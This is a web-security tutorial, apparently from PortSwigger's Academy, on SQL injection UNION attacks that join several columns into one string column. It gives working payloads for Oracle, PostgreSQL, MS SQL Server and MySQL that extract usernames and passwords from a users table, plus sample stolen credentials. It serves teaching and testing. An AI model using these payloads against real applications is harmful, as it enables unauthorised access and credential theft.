# Retrieving multiple values within a single column

In many real-world scenarios, the original query may only return one string-compatible column (even if it returns multiple total columns). Rather than running separate queries for each piece of data, you can concatenate multiple column values together into that single string column using a delimiter to clearly separate the values.

## How String Concatenation Works

By joining multiple columns with a custom separator character (such as `~` or `:`), you can extract pairs of data like usernames and passwords in a single row of output.

### Oracle Example

On Oracle databases, the double-pipe (`||`) operator concatenates strings. To retrieve `username` and `password` values from the `users` table separated by a tilde (`~`), submit:

```
' UNION SELECT username || '~' || password FROM users--
```

> If the original query returns two columns where only the second accepts strings, place `NULL` in the first position: `' UNION SELECT NULL, username || '~' || password FROM users--`).

### Example Output

The application renders the combined values together in the response, making it easy to split the credentials manually:

```
administrator~s3cure
wiener~peter
carlos~montoya
```

## Database-Specific Concatenation Syntax

Different database engines use different operators or functions to join strings together:

| Database | Concatenation Syntax | Example Payload |
| --- | --- | --- |
| Oracle | `\|\|` (double-pipe) | `' UNION SELECT username \|\| '~' \|\| password FROM users--` |
| PostgreSQL | `\|\|` (double-pipe) | `' UNION SELECT username \|\| '~' \|\| password FROM users--` |
| MS SQL Server | `+` (plus sign) | `' UNION SELECT username + '~' + password FROM users--` |
| MySQL | `CONCAT()` function or space between strings | `' UNION SELECT CONCAT(username, '~', password) FROM users#` |

Different databases use different syntax to perform string concatenation. For more details, see the [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet).
